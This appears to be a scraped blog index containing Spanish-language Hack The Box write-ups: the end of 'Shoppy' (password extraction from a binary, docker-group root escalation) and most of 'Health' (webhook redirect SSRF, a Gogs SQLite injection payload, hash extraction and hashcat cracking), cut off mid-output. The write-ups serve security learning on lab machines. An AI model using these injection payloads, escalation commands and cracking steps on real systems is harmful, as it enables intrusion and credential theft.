5 6 7 8 9 10 11 12 13 14 jaeger@shoppy:~$ sudo -l -l [sudo] password for jaeger: Matching Defaults entries for jaeger on shoppy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User jaeger may run the following commands on shoppy: Sudoers entry: RunAsUsers: deploy Commands: /home/deploy/password-manager jaeger@shoppy:~$ file /home/deploy/password-manager /home/deploy/password-manager: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=400b2ed9d2b4121f9991060f343348080d2905d1, for GNU/Linux 3.2.0, not stripped jaeger@shoppy:~$ Tras ejecutar el fichero este espera una contraseña.\n1 2 3 4 5 jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager Welcome to Josh password manager! Please enter your master password: password123 Access denied! This incident will be reported ! jaeger@shoppy:~$ Observando las strings del fichero se muestra que realiza un cat a un archivo de texto al cual no tenemos acceso.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 jaeger@shoppy:~$ strings /home/deploy/password-manager |head -n 50 [.. snip ..] GLIBC_2.2.5 CXXABI_1.3 GLIBCXX_3.4 GLIBCXX_3.4.21 u/UH []A\\A]A^A_ Welcome to Josh password manager! Please enter your master password: Access granted! Here is creds ! cat /home/deploy/creds.txt Access denied! This incident will be reported ! ;*3$\u0026#34; zPLR GCC: (Debian 10.2.1-6) 10.2.1 20210110 crtstuff.c deregister_tm_clones __do_global_dtors_aux completed.0 __do_global_dtors_aux_fini_array_entry [.. snip ..] jaeger@shoppy:~$ Utilizamos Ghidra para analizar el codigo fuente del archivo, observamos la contraseña esperada en el codigo, esta es: Sample.\nCon esta contraseña la ejecución del fichero nos muestra el contenido del archivo de texto, credenciales.\n1 2 3 4 5 6 7 8 jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager Welcome to Josh password manager! Please enter your master password: Sample Access granted! Here is creds ! Deploy Creds : username: deploy password: Deploying@pp! jaeger@shoppy:~$ El usuario existe en la máquina por lo que cambiamos a este usuario exitosamente con las credenciales.\n1 2 3 4 5 6 7 jaeger@shoppy:~$ su deploy Password: # Deploying@pp! $ whoami deploy $ id uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker) $ Observamos el codigo fuente del fichero que ejecutamos anteriormente.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 $ cat password-manager.cpp #include \u0026lt;iostream\u0026gt; #include \u0026lt;string\u0026gt; int main() { std::cout \u0026lt;\u0026lt; \u0026#34;Welcome to Josh password manager!\u0026#34; \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026#34;Please enter your master password: \u0026#34;; std::string password; std::cin \u0026gt;\u0026gt; password; std::string master_password = \u0026#34;\u0026#34;; master_password += \u0026#34;S\u0026#34;; master_password += \u0026#34;a\u0026#34;; master_password += \u0026#34;m\u0026#34;; master_password += \u0026#34;p\u0026#34;; master_password += \u0026#34;l\u0026#34;; master_password += \u0026#34;e\u0026#34;; if (password.compare(master_password) == 0) { std::cout \u0026lt;\u0026lt; \u0026#34;Access granted! Here is creds !\u0026#34; \u0026lt;\u0026lt; std::endl; system(\u0026#34;cat /home/deploy/creds.txt\u0026#34;); return 0; } else { std::cout \u0026lt;\u0026lt; \u0026#34;Access denied! This incident will be reported !\u0026#34; \u0026lt;\u0026lt; std::endl; return 1; } }$ Privesc El usuario deploy pertenece al grupo de docker.\n1 2 3 $ id uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker) $ Tras intentar con el comando sugerido por GTFOBins - docker logramos obtener una shell root y la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 $ docker run -v /:/mnt --rm -it alpine chroot /mnt sh # id uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo) # pwd / # cd root # ls root.txt # cat root.txt df06983c0ca5a149f086e79984152a8a # ","description":"Shoppy expone un sitio web donde explotamos una vulnerabilidad NoSQL Injection la cual nos permitió acceder a información de usuarios, con ello logramos ingresar a Mattermost donde encontramos credenciales que nos dieron acceso por SSH. Accedimos a un segundo usuario con la información obtenida de un fichero ejecutable. Finalmente escalamos privilegios utilizando el comando de docker.","id":8,"section":"posts","tags":["noSQL","john","mattermost","javascript","ghidra","docker"],"title":"Hack The Box - Shoppy","uri":"https://sckull.github.io/posts/shoppy/"},{"content":"\rEn Health descubrimos Gogs a traves de redirecciónes realizadas con Python, por el sitio web que expone una funcionalidad de monitoreo de servicios web. Mediante una inyeccion SQL obtuvimos credenciales para acceder por SSH. Finalmente escalamos privilegios por medio de artisan y la funcionalidad del sitio web.\nNombre Health OS Linux Puntos 30 Dificultad Media IP 10.10.11.176 Maker irogir\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6, 5.3, 5.3, 4.7, 4.7],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra multiples puertos abiertos: http (80) y ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Nmap 7.92 scan initiated Sat Sep 10 00:43:16 2022 as: nmap -p22,80 -sV -sC -oN nmap_scan 10.10.11.176 Nmap scan report for 10.10.11.176 (10.10.11.176) Host is up (0.064s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 32:b7:f4:d4:2f:45:d3:30:ee:12:3b:03:67:bb:e6:31 (RSA) | 256 86:e1:5d:8c:29:39:ac:d7:e8:15:e6:49:e2:35:ed:0c (ECDSA) |_ 256 ef:6b:ad:64:d5:e4:5b:3e:66:79:49:f4:ec:4c:23:9f (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: HTTP Monitoring Tool Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Sep 10 00:43:28 2022 -- 1 IP address (1 host up) scanned in 12.30 seconds Web Site El sitio web presenta un formulario el cual se describe como una utilidad que permite verificar si un sitio web esta disponible. En el formulario es posible ingresar un intervalo en el cual se ejecuta el \u0026ldquo;webhook\u0026rdquo;, en este se vincula el sitio crontab.guru, tomando como intervalo la sintaxis de un cronjob.\nDirectory Brute Forcing feroxbuster no muestra alguna otra direccion por la cual podamos observar codigo fuente o comportamiento del sitio.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 π ~/htb/health ❯ feroxbuster -u http://10.10.11.176/ --depth 1 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.3.3 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.11.176/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.3 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔃 Recursion Depth │ 1 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 301 9l 28w 309c http://10.10.11.176/js 301 9l 28w 310c http://10.10.11.176/css 301 9l 28w 317c http://10.10.11.176/javascript 403 9l 28w 277c http://10.10.11.176/server-status WebHook Creamos un webhook con un intervalo de 1 minuto, ingresamos distintas url y puertos, en Payload y Monitored URL.\nPor otro lado ejecutamos netcat en los puertos ya configurados en el webhook. Tras un momento obtuvimos una solicitud POST con información en formato Json en la url del payload.\n1 2 3 4 5 6 7 8 9 10 π ~/htb/health ❯ nc -lvp 8080 listening on [any] 8080 ... connect to [10.10.14.207] from 10.10.11.176 [10.10.11.176] 40290 POST / HTTP/1.1 Host: 10.10.14.207:8080 Accept: */* Content-type: application/json Content-Length: 103 {\u0026#34;webhookUrl\u0026#34;:\u0026#34;http:\\/\\/10.10.14.207:8080\u0026#34;,\u0026#34;monitoredUrl\u0026#34;:\u0026#34;http:\\/\\/10.10.14.207:9090\u0026#34;,\u0026#34;health\u0026#34;:\u0026#34;down\u0026#34;} En el puerto 9090 de Monitored URL obtuvimos una solicitud GET.\n1 2 3 4 5 6 π ~/htb/health ❯ nc -lvp 9090 listening on [any] 9090 ... connect to [10.10.14.207] from 10.10.11.176 [10.10.11.176] 40384 GET / HTTP/1.0 Host: 10.10.14.207:9090 Connection: close Con ello podemos decir que el payload obtiene información de si la direccion en Monitored URL está disponible como lo describe el sitio y la envia a la url de payload en formato json.\nIntentamos ingresar direcciones locales y archivos locales pero no es posible, nos muestra un mensaje de error. Seguramente existe un filtro para unicamente direcciónes url.\nRedirect Con Python intentamos crear una redirección, tambien agregamos codigo para obtener la información de las solicitudes POST. Tras agregar la direccion de localhost obtuvimos el body del sitio web, este parece ser el sitio web del webhook con ello sabemos que la redirección si funciona.\n1 2 3 4 5 6 7 π ~/htb/health/www ❯ sudo python3 script.py HTTP server running on port 80 10.10.11.176 - - [05/Sep/2022 01:23:05] \u0026#34;GET / HTTP/1.0\u0026#34; 307 - 10.10.11.176 - - [05/Sep/2022 01:23:06] \u0026#34;POST / HTTP/1.1\u0026#34; 200 - b\u0026#39;{\u0026#34;webhookUrl\u0026#34;:\u0026#34;http:\\\\/\\\\/10.10.14.207\u0026#34;,\u0026#34;monitoredUrl\u0026#34;:\u0026#34;http:\\\\/\\\\/10.10.14.207\u0026#34;,\u0026#34;health\u0026#34;:\u0026#34;up\u0026#34;,\u0026#34;body\u0026#34;:\u0026#34;\u0026lt;!DOCTYPE html\u0026gt;\\\\n\u0026lt;html lang=\\\\\u0026#34;en\\\\\u0026#34;\u0026gt;\\\\n\u0026lt;head\u0026gt;\\\\n \u0026lt;meta charset=\\\\\u0026#34;UTF-8\\\\\u0026#34;\u0026gt;\\\\n \u0026lt;meta name=\\\\\u0026#34;viewport\\\\\u0026#34; content=\\\\\u0026#34;width=device-width, initial-scale=1.0\\\\\u0026#34;\u0026gt;\\\\n \u0026lt;meta http-equiv=\\\\\u0026#34;X-UA-Compatible\\\\\u0026#34; content=\\\\\u0026#34;ie=edge\\\\\u0026#34;\u0026gt;\\\\n \u0026lt;title\u0026gt;HTTP Monitoring Tool\u0026lt;\\\\/title\u0026gt;\\\\n \u0026lt;link href=\\\\\u0026#34;http:\\\\/\\\\/127.0.0.1\\\\/css\\\\/app.css\\\\\u0026#34; rel=\\\\\u0026#34;stylesheet\\\\\u0026#34; type=\\\\\u0026#34;text\\\\/css\\\\\u0026#34;\\\\/\u0026gt;\\\\n\u0026lt;\\\\/head\u0026gt;\\\\n\u0026lt;body\u0026gt;\\\\n\u0026lt;div class=\\\\\u0026#34;container\\\\\u0026#34;\u0026gt;\\\\n \u0026lt;div class=\\\\\u0026#34;container\\\\\u0026#34; style=\\\\\u0026#34;padding: 150px\\\\\u0026#34;\u0026gt;\\\\n\\\\n\\\\t\u0026lt;h1 class=\\\\\u0026#34;text-center\\\\\u0026#34;\u0026gt;health.htb\u0026lt;\\\\/h1\u0026gt;\\\\n\\\\t\u0026lt;h4 class=\\\\\u0026#34;text-center\\\\\u0026#34;\u0026gt;Simple health checks for any URL\u0026lt;\\\\/h4\u0026gt;\\\\n\\\\n\\\\t\u0026lt;hr\u0026gt;\\\\n\\\\n\\\\n\\\\n\\\\n\\\\t\u0026lt;p\u0026gt;This is a free utility that allows you to remotely check whether an http service is available. It is useful if you want to check whether the server is correctly running or if there are any firewall issues blocking access.\u0026lt;\\\\/p\u0026gt;\\\\n\\\\n\\\\t\u0026lt;div class=\\\\\u0026#34;card-header\\\\\u0026#34;\u0026gt;\\\\n\\\\t Configure Webhook\\\\n\\\\t\u0026lt;\\\\/div\u0026gt;\\\\n\\\\n\\\\n\\\\t\\\\n\\\\t\\\\n\\\\t\\\\n\\\\t\u0026lt;div class=\\\\\u0026#34;mx-auto\\\\\u0026#34; style=\\\\\u0026#34;width: 700px; padding: 20px 0 70px 0\\\\\u0026#34;\u0026gt;\\\\n\\\\t \u0026lt;form method=\\\\\u0026#34;post\\\\\u0026#34; action=\\\\\u0026#34;http:\\\\/\\\\/127.0.0.1\\\\/webhook\\\\\u0026#34;\u0026gt;\\\\n\\\\t\\\\t\u0026lt;input type=\\\\\u0026#34;hidden\\\\\u0026#34; name=\\\\\u0026#34;_token\\\\\u0026#34; value=\\\\\u0026#34;zKd11gsTX2jhuPuDWS1ZVdEa1XauOHNoZhKPhkg5\\\\\u0026#34;\u0026gt;\\\\n\\\\t\\\\t\u0026lt;div class=\\\\\u0026#34;pt-2 form-group\\\\\u0026#34;\u0026gt;\\\\n\\\\t\\\\t \u0026lt;label for=\\\\\u0026#34;webhookUrl\\\\\u0026#34;\u0026gt;Payload URL:\u0026lt;\\\\/label\u0026gt;\\\\n\\\\t\\\\t \u0026lt;input type=\\\\\u0026#34;text\\\\\u0026#34; class=\\\\\u0026#34;form-control\\\\\u0026#34; name=\\\\\u0026#34;webhookUrl\\\\\u0026#34;\\\\n\\\\t\\\\t\\\\t placeholder=\\\\\u0026#34;http:\\\\/\\\\/example.com\\\\/postreceive\\\\\u0026#34;\\\\/\u0026gt;\\\\n\\\\t\\\\t\u0026lt;\\\\/div\u0026gt;\\\\n\\\\n\\\\t\\\\t\u0026lt;div class=\\\\\u0026#34;pt-2 form-group\\\\\u0026#34;\u0026gt;\\\\n\\\\t\\\\t \u0026lt;label for=\\\\\u0026#34;monitoredUrl\\\\\u0026#34;\u0026gt;Monitored URL:\u0026lt;\\\\/label\u0026gt;\\\\n\\\\t\\\\t \u0026lt;input type=\\\\\u0026#34;text\\\\\u0026#34; class=\\\\\u0026#34;form-control\\\\\u0026#34; name=\\\\\u0026#34;monitoredUrl\\\\\u0026#34; placeholder=\\\\\u0026#34;http:\\\\/\\\\/example.com\\\\\u0026#34;\\\\/\u0026gt;\\\\n\\\\t\\\\t\u0026lt;\\\\/div\u0026gt;\\\\n\\\\n\\\\t\\\\t\u0026lt;div class=\\\\\u0026#34;pt-2 form-group\\\\\u0026#34;\u0026gt;\\\\n\\\\t\\\\t \u0026lt;label for=\\\\\u0026#34;frequency\\\\\u0026#34;\u0026gt;Interval:\u0026lt;\\\\/label\u0026gt;\\\\n\\\\t\\\\t \u0026lt;input type=\\\\\u0026#34;text\\\\\u0026#34; class=\\\\\u0026#34;form-control\\\\\u0026#34; name=\\\\\u0026#34;frequency\\\\\u0026#34; placeholder=\\\\\u0026#34;*\\\\/5 * * * *\\\\\u0026#34;\\\\/\u0026gt;\\\\n\\\\t\\\\t \u0026lt;small class=\\\\\u0026#34;form-text text-muted\\\\\u0026#34;\u0026gt;Please make use of cron syntax, see \u0026lt;a\\\\n\\\\t\\\\t\\\\t href=\\\\\u0026#34;https:\\\\/\\\\/crontab.guru\\\\/\\\\\u0026#34;\u0026gt;here\u0026lt;\\\\/a\u0026gt; for reference.\u0026lt;\\\\/small\u0026gt;\\\\n\\\\t\\\\t\u0026lt;\\\\/div\u0026gt;\\\\n\\\\n\\\\t\\\\t\u0026lt;p class=\\\\\u0026#34;pt-3\\\\\u0026#34;\u0026gt;Under what circumstances should the webhook be sent?\u0026lt;\\\\/p\u0026gt;\\\\n\\\\n\\\\t\\\\t\u0026lt;select class=\\\\\u0026#34;form-select\\\\\u0026#34; name=\\\\\u0026#34;onlyError\\\\\u0026#34;\u0026gt;\\\\n\\\\t\\\\t \u0026lt;option value=\\\\\u0026#34;1\\\\\u0026#34; selected\u0026gt;Only when Service is not available\u0026lt;\\\\/option\u0026gt;\\\\n\\\\t\\\\t [.. snip ...] \u0026lt;!-- Links --\u0026gt;\\\\n \u0026lt;h6 class=\\\\\u0026#34;text-uppercase fw-bold mb-4\\\\\u0026#34;\u0026gt;\\\\n Contact\\\\n \u0026lt;\\\\/h6\u0026gt;\\\\n \u0026lt;p\u0026gt;\u0026lt;i class=\\\\\u0026#34;fas fa-home me-3\\\\\u0026#34;\u0026gt;\u0026lt;\\\\/i\u0026gt; New York, NY 10012, US\u0026lt;\\\\/p\u0026gt;\\\\n \u0026lt;p\u0026gt;\\\\n \u0026lt;i class=\\\\\u0026#34;fas fa-envelope me-3\\\\\u0026#34;\u0026gt;\u0026lt;\\\\/i\u0026gt;\\\\n contact@health.htb\\\\n \u0026lt;\\\\/p\u0026gt;\\\\n \u0026lt;p\u0026gt;\u0026lt;i class=\\\\\u0026#34;fas fa-phone me-3\\\\\u0026#34;\u0026gt;\u0026lt;\\\\/i\u0026gt; + 01 234 567 88\u0026lt;\\\\/p\u0026gt;\\\\n \u0026lt;p\u0026gt;\u0026lt;i class=\\\\\u0026#34;fas fa-print me-3\\\\\u0026#34;\u0026gt;\u0026lt;\\\\/i\u0026gt; + 01 234 567 89\u0026lt;\\\\/p\u0026gt;\\\\n \u0026lt;\\\\/div\u0026gt;\\\\n \u0026lt;!-- Grid column --\u0026gt;\\\\n \u0026lt;\\\\/div\u0026gt;\\\\n \u0026lt;!-- Grid row --\u0026gt;\\\\n \u0026lt;\\\\/div\u0026gt;\\\\n \u0026lt;\\\\/section\u0026gt;\\\\n \u0026lt;!-- Section: Links --\u0026gt;\\\\n\\\\n \u0026lt;!-- Copyright --\u0026gt;\\\\n \u0026lt;div class=\\\\\u0026#34;text-center p-4\\\\\u0026#34; style=\\\\\u0026#34;background-color: rgba(0, 0, 0, 0.05);\\\\\u0026#34;\u0026gt;\\\\n \\\\u00a9 2014 Copyright:\\\\n \u0026lt;a class=\\\\\u0026#34;text-reset fw-bold\\\\\u0026#34; href=\\\\\u0026#34;http:\\\\/\\\\/health.htb\\\\\u0026#34;\u0026gt;health.htb\u0026lt;\\\\/a\u0026gt;\\\\n \u0026lt;\\\\/div\u0026gt;\\\\n \u0026lt;!-- Copyright --\u0026gt;\\\\n\u0026lt;\\\\/footer\u0026gt;\\\\n\u0026lt;!-- Footer --\u0026gt;\\\\n\\\\n\u0026lt;\\\\/body\u0026gt;\\\\n\u0026lt;\\\\/html\u0026gt;\\\\n\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;HTTP\\\\/1.0 307 Temporary Redirect\u0026#34;,\u0026#34;headers\u0026#34;:{\u0026#34;Server\u0026#34;:\u0026#34;Apache\\\\/2.4.29 (Ubuntu)\u0026#34;,\u0026#34;Date\u0026#34;:\u0026#34;Sat, 10 Sep 2022 01:23:15 GMT\u0026#34;,\u0026#34;Location\u0026#34;:\u0026#34;http:\\\\/\\\\/127.0.0.1\u0026#34;,\u0026#34;Cache-Control\u0026#34;:\u0026#34;private, must-revalidate\u0026#34;,\u0026#34;pragma\u0026#34;:\u0026#34;no-cache\u0026#34;,\u0026#34;expires\u0026#34;:\u0026#34;-1\u0026#34;,\u0026#34;Set-Cookie\u0026#34;:\u0026#34;laravel_session=eyJpdiI6ImhMK21VSlJQNkFUU1g0Mi9DalFTZlE9PSIsInZhbHVlIjoiektXNGhLNVlHdGdBOHUyL1dVOENscDlRWXZSeXR6aFREYlcwU0FIL0tFTG4va25JU0lwYXFVY1U5RDB4MzFveWw0YWhGUy8vKzNnRDhOd2hZd3loNVNlaUM0M0tkcUt1MFdMUmREcks2WDlsZnBxZDRySmtBd0RIdU9DMlR4TlYiLCJtYWMiOiI5ZDU0MGU4YTIyYWJmYmEwZmZkNTMxOGQ5ODdjZTU3Y2VjYzFkMmQxYTYzMzEwZGNhZTMxMjg5ZWYyMTU5NjYwIiwidGFnIjoiIn0%3D; expires=Sat, 10-Sep-2022 03:23:15 GMT; Max-Age=7200; path=\\\\/; httponly; samesite=lax\u0026#34;,\u0026#34;Vary\u0026#34;:\u0026#34;Accept-Encoding\u0026#34;,\u0026#34;Content-Length\u0026#34;:\u0026#34;7341\u0026#34;,\u0026#34;Connection\u0026#34;:\u0026#34;close\u0026#34;,\u0026#34;Content-Type\u0026#34;:\u0026#34;text\\\\/html; charset=UTF-8\u0026#34;}}\u0026#39; Script en Python: server.py\nRefs. 1, 2, 3\nAl no encontrar más información en el puerto 80 nuevamente volvimos a ejecutar un escaneo de puertos, esta vez observamos el puerto 3000 como filtrado.\n1 2 3 4 5 6 7 8 9 10 11 12 π ~/htb/health ❯ sudo nmap -Pn -sS 10.10.11.176 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-10 01:35 CST Nmap scan report for 10.10.11.176 (10.10.11.176) Host is up (0.087s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 3000/tcp filtered ppp Nmap done: 1 IP address (1 host up) scanned in 3.85 seconds π ~/htb/health ❯ Agregamos la direccion de localhost al puerto 3000, obtuvimos el cuerpo o html del sitio, observamos que es una version de Gogs de 2014.\n1 2 3 4 5 [.. snip ..] \u0026lt;meta name=\u0026#34;description\u0026#34; content=\u0026#34;Gogs(Go Git Service) a painless self-hosted Git Service written in Go\u0026#34; /\u0026gt; [.. snip ..] \u0026lt;p class=\u0026#34;left\u0026#34; id=\u0026#34;footer-rights\u0026#34;\u0026gt;© 2014 GoGits · Version: 0.5.5.1010 Beta · Page: \u0026lt;strong\u0026gt;1ms\u0026lt;/strong\u0026gt; [.. snip ..] Gogs - SQLi Tras observar las versiones de Gogs en su repositorio observamos que en la version siguiente (v0.5.8) se repararon tres vulnerabilidades. Una de ellas se muestra en exploitDB como SQL Injection. Sin embargo tras intentar los distintos payloads no obtuvimos ninguna respuesta similar al del PoC. Unicamente una estructura json sin información o ninguna estructura.\n1 {\u0026#34;data\u0026#34;:[],\u0026#34;ok\u0026#34;:true} Es por ello que ejecutamos localmente la version de Gogs v0.5.5 vulnerable para identificar un nuevo payload que nos permita obtener información. Logramos identificar que posiblemente no esté utilizando MySQL si no, SQLite, ya que tras la configuración de gogs es la primera opcion recomendada, tras utilizar Payloads de SQLite logramos obtener la version de este localmente.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 sckull@vivid:~/tmp/gogs$ curl -s \u0026#34;http://127.0.0.1:3000/api/v1/users/search?q=%27)/**/union/**/all/**/select/**/null,null,sqlite_version(),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/from/**/user/**/where/**/(%27%25%27%3D%27\u0026#34; | jq { \u0026#34;data\u0026#34;: [ { \u0026#34;username\u0026#34;: \u0026#34;admins\u0026#34;, \u0026#34;avatar\u0026#34;: \u0026#34;//1.gravatar.com/avatar/e6d67fed862c439aa6e911ce49c7857d\u0026#34; }, { \u0026#34;username\u0026#34;: \u0026#34;3.8.5\u0026#34;, \u0026#34;avatar\u0026#34;: \u0026#34;//1.gravatar.com/avatar/\u0026#34; } ], \u0026#34;ok\u0026#34;: true } sckull@vivid:~/tmp/gogs$ Modificamos la redirección del script enviando el payload encontrado, logramos obtener la version de SQLite: 3.8.5, tambien observamos el nombre de usuario susanne.\n1 2 3 4 5 6 7 8 9 10 11 12 13 { \u0026#34;data\u0026#34;:[ { \u0026#34;username\u0026#34;:\u0026#34;susanne\u0026#34;, \u0026#34;avatar\u0026#34;:\u0026#34;//1.gravatar.com/avatar/c11d48f16f254e918744183ef7b89fce\u0026#34; }, { \u0026#34;username\u0026#34;:\u0026#34;3.8.5\u0026#34;, \u0026#34;avatar\u0026#34;:\u0026#34;//1.gravatar.com/avatar/\u0026#34; } ], \u0026#34;ok\u0026#34;:true } Descubrimos quen en la tabla user (localmente) existe una columna que contiene el hash de la contraseña de los usuarios.\n1 2 3 4 5 6 7 8 9 sqlite\u0026gt; .schema user CREATE TABLE `user` (`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, `lower_name` TEXT NOT NULL, `name` TEXT NOT NULL, `full_name` TEXT NULL, `email` TEXT NOT NULL, `passwd` TEXT NOT NULL, `login_type` INTEGER NULL, `login_source` INTEGER NOT NULL DEFAULT 0, `login_name` TEXT NULL, `type` INTEGER NULL, `num_followers` INTEGER NULL, `num_followings` INTEGER NULL, `num_stars` INTEGER NULL, `num_repos` INTEGER NULL, `avatar` TEXT NOT NULL, `avatar_email` TEXT NOT NULL, `location` TEXT NULL, `website` TEXT NULL, `is_active` INTEGER NULL, `is_admin` INTEGER NULL, `rands` TEXT NULL, `salt` TEXT NULL, `created` NUMERIC NULL, `updated` NUMERIC NULL, `description` TEXT NULL, `num_teams` INTEGER NULL, `num_members` INTEGER NULL); CREATE UNIQUE INDEX `UQE_user_name` ON `user` (`name`); CREATE UNIQUE INDEX `UQE_user_email` ON `user` (`email`); CREATE UNIQUE INDEX `UQE_user_lower_name` ON `user` (`lower_name`); sqlite\u0026gt; select * from user ...\u0026gt; ; 1|admins|admins||admin@localhost.com|1d3194f62a92992c2070df763a652968e11f46c5e1e08779d24df4331c8c1e2ba51e884302b7868664ac9d0da39a22595342|0|0||0|0|0|0|0|e6d67fed862c439aa6e911ce49c7857d|admin@localhost.com|||1|1|wtc2Dm1Avt|1K5zhdeEj9|2022-09-05 16:37:38|2022-09-05 16:37:38||0|0 sqlite\u0026gt; Password Hash Cracking Tras investigar, segun un Issue de Github es posible crackear el hash tras \u0026ldquo;crear\u0026rdquo; el hash sha256 con los valores en la base de datos. Obtuvimos los valores de las columnas: passwd y salt.\n1 2 passwd =\u0026gt; 66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37 salt =\u0026gt; sO3XIbeW14 Convertimos estos valores segun como lo indica el comentario del Issue.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # formato sha256:10000:base64(salt):pack(base64(hash)) # hash (passwd) # perl -e \u0026#39;print pack (\u0026#34;H*\u0026#34;, \u0026#34;66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37\u0026#34;)\u0026#39; | base64 hash: 66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37 ==\u0026gt; ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc= # salt # echo -n sO3XIbeW14 | base64 salt: sO3XIbeW14 ==\u0026gt; c08zWEliZVcxNA== # final hash sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc= Utilizamos hashcat con el wordlist rockyou, tras unos segundos obtuvimos el valor del hash.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 π ~/htb/health ❯ hashcat -m 10900 --force hash_gogs $ROCK --force hashcat (v6.1.1) starting... You have enabled --force to bypass dangerous warnings and errors! This can hide serious problems and should only be done when debugging. Do not report hashcat issues encountered when using --force. OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ============================================================================================================================= * Device #1: pthread-Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz, 2857/2921 MB (1024 MB allocatable), 4MCU Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers applied: * Zero-Byte * Single-Hash * Single-Salt * Slow-Hash-SIMD-LOOP Watchdog: Hardware monitoring interface not found on your system. Watchdog: Temperature abort trigger disabled. Host memory required for this attack: 65 MB Dictionary cache built: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344392 * Bytes.....: 139921507 * Keyspace..: 14344385 * 